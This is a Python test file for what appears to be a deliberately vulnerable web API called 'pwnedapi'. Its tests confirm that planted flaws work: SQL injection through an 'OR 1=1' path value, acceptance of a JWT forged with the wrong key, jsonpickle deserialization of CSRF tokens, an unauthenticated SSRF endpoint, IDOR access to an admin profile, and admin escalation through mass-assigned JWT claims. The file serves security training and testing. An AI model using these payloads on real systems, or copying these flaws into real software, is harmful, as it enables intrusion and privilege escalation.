import base64
import json
from unittest.mock import patch, MagicMock
import jwt as pyjwt


# ---------------------------------------------------------------------------
# Helpers (same pattern as test_api.py)
# ---------------------------------------------------------------------------

def _get_db():
    from pwnedapi.extensions import db
    return db

def _get_models():
    from pwnedapi.models import Config, Email, User, Note, Message, Tool, Scan, Room
    return Config, Email, User, Note, Message, Tool, Scan, Room

def _set_cookie_and_get(client, app, user, url, **kwargs):
    from pwnedapi.utils import encode_jwt
    token = encode_jwt(user.id)
    client.set_cookie('access_token', token, domain='localhost')
    return client.get(url, **kwargs)

def _set_cookie_and_request(client, app, user, method, url, json_data=None, extra_headers=None):
    from pwnedapi.utils import encode_jwt, CsrfToken
    token = encode_jwt(user.id)
    csrf_obj = CsrfToken(user.id)
    csrf_obj.sign(app.config['SECRET_KEY'])
    csrf_token = csrf_obj.serialize()
    client.set_cookie('access_token', token, domain='localhost')
    headers = {'Content-Type': 'application/json'}
    headers['X-Csrf-Token'] = csrf_token
    if extra_headers:
        headers.update(extra_headers)
    fn = getattr(client, method.lower())
    kwargs = {'headers': headers}
    if json_data is not None:
        kwargs['data'] = json.dumps(json_data)
    return fn(url, **kwargs)


class TestSQLInjection:
    """Tests that verify SQL injection vulnerabilities exist in the API."""

    def test_sqli_tool_info(self, app, client, user, db_session):
        """GET /tools/1 OR 1=1 returns data via SQL injection in tid param."""
        Config, _, _, _, _, Tool, _, _ = _get_models()
        db = _get_db()
        tool = Tool(name='Dig', path='dig', description='DNS lookup tool.')
        db.session.add(tool)
        db.session.commit()
        tool_id = tool.id

        resp = _set_cookie_and_get(client, app, user, f'/tools/{tool_id} OR 1=1')
        assert resp.status_code == 200
        data = resp.get_json()
        assert data is not None
        assert 'id' in data


class TestJWTBypass:
    """Tests that verify JWT verification can be bypassed."""

    def test_jwt_bypass_no_verify(self, app, client, user, db_session):
        """When JWT_VERIFY=False, a forged code_token with wrong key still authenticates."""
        Config, _, _, _, _, _, _, _ = _get_models()
        db = _get_db()
        config = Config.get_by_name('JWT_VERIFY')
        config.value = False
        db.session.commit()

        # Forge a code_token signed with the wrong key, containing a known code
        from datetime import datetime, timezone, timedelta
        code = '123456'
        payload = {
            'exp': datetime.now(tz=timezone.utc) + timedelta(days=1),
            'iat': datetime.now(tz=timezone.utc),
            'sub': user.id,
            'code': code,
        }
        forged_code_token = pyjwt.encode(payload, 'completely_wrong_key', algorithm='HS256')

        # Complete the passwordless flow with the forged token
        resp = client.post('/access-token', json={
            'code': code,
            'code_token': forged_code_token,
        })
        # Should succeed because verify_signature is False
        assert resp.status_code == 201

        config.value = True
        db.session.commit()


class TestPickleDeserialization:
    """Tests that verify unsafe pickle deserialization in CSRF token handling."""

    def test_pickle_deserialization_csrf(self, app, client, user, db_session):
        """The csrf_protect decorator deserializes CSRF token using jsonpickle.decode."""
        from pwnedapi.utils import CsrfToken
        csrf_obj = CsrfToken(user.id)
        csrf_obj.sign(app.config['SECRET_KEY'])
        csrf_token = csrf_obj.serialize()

        # The fact that this is a base64-encoded jsonpickle object is the vulnerability
        decoded = base64.b64decode(csrf_token).decode()
        assert 'py/object' in decoded

        # Exercise the jsonpickle deserialization path
        resp = _set_cookie_and_request(client, app, user, 'PATCH', '/users/me',
            json_data={'email': user.email, 'name': 'Updated Name'},
        )
        assert resp.status_code == 200


class TestSSRF:
    """Tests that verify SSRF via unfurl endpoint."""

    def test_unfurl_ssrf_no_auth(self, app, client, db_session):
        """POST /unfurl works without authentication."""
        with patch('pwnedapi.utils.requests.get') as mock_get:
            mock_resp = MagicMock()
            mock_resp.content = b'<html><head><meta property="og:title" content="Test"></head></html>'
            mock_get.return_value = mock_resp

            resp = client.post('/unfurl',
                json={'url': 'http://example.com'},
                content_type='application/json',
            )
            assert resp.status_code == 201


class TestIDOR:
    """Tests that verify IDOR vulnerabilities."""

    def test_idor_user_profile(self, app, client, user, admin_user, db_session):
        """Authenticated user can GET /users/<other_user_id> (any user's profile)."""
        resp = _set_cookie_and_get(client, app, user, f'/users/{admin_user.id}')
        assert resp.status_code == 200
        data = resp.get_json()
        assert data['id'] == admin_user.id
        assert data['email'] == admin_user.email


class TestMassAssignment:
    """Tests that verify mass assignment vulnerability in user creation."""

    def test_mass_assignment_user_creation(self, app, client, db_session):
        """JWT payload with extra fields (like role=0) gets passed to User constructor."""
        from pwnedapi.utils import encode_jwt
        _, _, User, _, _, _, _, _ = _get_models()
        db = _get_db()

        malicious_claims = {
            'email': 'attacker@evil.com',
            'name': 'Attacker',
            'avatar': None,
            'signature': '',
            'role': 0,
        }
        activate_token = encode_jwt('new_user', claims=malicious_claims)

        resp = client.post('/users',
            json={'activate_token': activate_token},
            content_type='application/json',
        )
        assert resp.status_code == 201

        db.session.expire_all()
        attacker = User.get_by_email('attacker@evil.com')
        assert attacker is not None
        assert attacker.role == 0

        db.session.delete(attacker)
        db.session.commit()
